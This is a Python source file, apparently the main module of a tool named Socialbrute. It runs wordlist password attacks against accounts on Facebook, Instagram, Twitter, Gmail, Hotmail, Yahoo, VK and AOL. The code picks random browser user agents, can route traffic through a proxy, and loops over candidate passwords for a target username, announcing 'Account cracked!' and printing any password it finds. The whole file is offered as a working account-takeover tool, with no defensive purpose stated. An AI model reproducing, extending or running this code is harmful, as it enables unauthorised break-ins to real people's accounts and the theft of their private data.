# -*- coding: utf-8 -*-

import sys
import random
import click
from yaspin import yaspin

from .modules.facebook import Facebook
from .modules.gmail import Gmail
from .modules.hotmail import Hotmail
from .modules.instagram import Instagram
from .modules.twitter import Twitter
from .modules.vk import Vk
from .modules.yahoo import Yahoo
from .modules.aol import Aol
from .helpers import *
from .browser import *

"""Main module."""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1",
    "Mozilla/5.0 (X11; U; Linux amd64; en-US; rv:5.0) Gecko/20110619 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1",
]

class Socialbrute(object):
    
    def __init__(self, interactive=True, proxy=None):
        self.browser = Browser()
        ua = random.choice(USER_AGENTS)
        if proxy:
            self.browser.start(headless=interactive, proxy=proxy, user_agent=ua)
        else:
            self.browser.start(headless=interactive, user_agent=ua)

    def stop(self):
        self.browser.stop()

    def run(self, social, username, wordlist, delay, token, proxy=None):
        total = len(open(wordlist,'r').read().split('\n'))

        click.echo('     Social Network: ' + (Colors.YELLOW) + social.capitalize() + (Colors.ENDC))
        click.echo('           Wordlist: ' + (Colors.YELLOW) + wordlist + (Colors.ENDC))
        click.echo('        Total Words: ' + (Colors.YELLOW) + str(total) + (Colors.ENDC))
        click.echo('              Delay: ' + (Colors.YELLOW) + str(delay) + (Colors.ENDC))

        # to resolve the UnboundLocalError: local variable 'a' referenced before assignment
        a = None
        
        if social == 'facebook':
            a = Facebook(self.browser)
        elif social == 'instagram':
            a = Instagram(self.browser)
        elif social == 'twitter':
            a = Twitter(self.browser)
        elif social == 'gmail':
            a = Gmail(self.browser)
        elif social == 'hotmail':
            a = Hotmail(self.browser)
        elif social == 'yahoo':
            a = Yahoo(self.browser)
        elif social == 'vk':
            a = Vk(self.browser)
        elif social == 'aol':
            a = Aol(self.browser)
        else:
            print_error("Social network not supported!")
            return

        a.set_config(username, wordlist, delay)
        user_exists = a.check_user()

        click.echo('           Username: ' + (Colors.YELLOW) + username + (Colors.ENDC))
        click.echo('     Extracted Name: ' + (Colors.YELLOW) + a.name + (Colors.ENDC))
        click.echo('')

        if not user_exists:
            print_error("It was not possible to retrieve the name from %s." % (social.capitalize()))
            click.confirm('Do you want to continue?', abort=True)

        with yaspin(text="Brute forcing... Please wait...", color="cyan") as sp:
            password = a.crack()
            if password:
                sp.ok("✔")
                print_success("Account cracked!")
                click.echo("Username: " + (Colors.GREEN) + (Colors.BOLD) + "%s" % username + (Colors.ENDC))
                click.echo("Password: " + (Colors.GREEN) + (Colors.BOLD) + "%s" % password + (Colors.ENDC))
            else:
                sp.fail("✗")
                print_error("Account not cracked! Try to crack it with another wordlist.")
                return
